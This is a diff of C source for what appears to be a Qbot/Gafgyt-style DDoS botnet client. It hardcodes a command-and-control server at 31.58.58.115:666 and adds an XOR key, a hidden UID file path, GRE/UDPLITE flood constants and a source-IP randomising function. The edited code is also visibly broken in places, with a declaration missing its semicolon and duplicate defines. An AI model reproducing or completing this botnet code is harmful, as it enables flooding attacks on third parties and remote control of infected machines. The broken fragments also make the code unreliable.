@@ -1,5 +1,4 @@
 #define PR_SET_NAME 15
-#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
 #define PAD_RIGHT 1
 #define PAD_ZERO 2
 #define PRINT_BUF_LEN 12
@@ -9,10 +8,26 @@
 #define CMD_DO    253
 #define CMD_DONT  254
 #define OPT_SGA   3
+
 #define BUFFER_SIZE 4096
-#define MAXTTL 128
-#define __FAVOR_BSD
 #define STD2_SIZE 1024
+#define MAXTTL 128
+#define PHI 0x9e3779b9
+
+#define PROTO_GRE 47
+#define GRE_PROTO_IP 0x0800
+#define PROTO_UDPLITE 136
+
+#define STD_PACKETS 50
+#define UDP_HDRLEN 8
+#define IP_MAXPACKET 65535
+#define UID_PATH "/etc/.uid"
+#define XOR_KEY "demonkey"
+#define IP4_HDRLEN 20
+#define ICMP_HDRLEN 8
+#define std_packets 1460
+
+
 #include <arpa/inet.h>
 #include <errno.h>
 #include <fcntl.h>
@@ -40,8 +55,12 @@
 #include <time.h>
 #include <unistd.h>
 
- 
-unsigned char *commServer[] =
+#define __FAVOR_BSD
+#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
+
+
+
+ unsigned char *commServer[] =
 {
         "31.58.58.115:666"
 };
@@ -60,7 +79,7 @@ uint64_t numpids = 0;
 struct in_addr ourIP;
 unsigned char macAddress[6] = {0};
 #define PHI 0x9e3779b9
-static uint32_t Q[4096], c = 362436;
+
  static unsigned long int Q[4096], c = 362436;
 volatile int limiter;
 volatile unsigned int pps;
@@ -916,7 +935,18 @@ int socket_connect(char *host, in_port_t port)
     return sock;
 }
 
+#ifndef __UDPHDR_DEFINED
+#define __UDPHDR_DEFINED
 
+struct udphdr {
+    uint16_t source;
+    uint16_t dest;
+    uint16_t len;
+    uint16_t check;
+};
+
+#endif
+int getBogos(unsigned char *bogomips)
  int randnum(int min_num, int max_num)
 {
     int result = 0, low_num = 0, hi_num = 0;
@@ -933,6 +963,10 @@ int socket_connect(char *host, in_port_t port)
 
     result = (rand_cmwc() % (hi_num - low_num)) + low_num;
     return result;
+}
+in_addr_t GRIP(in_addr_t netmask) {
+	in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
+	return tmp ^ ( rand_cmwc() & ~netmask);
 }
 void setup_ip_header(struct iphdr *iph, uint32_t saddr, uint32_t daddr)
 {
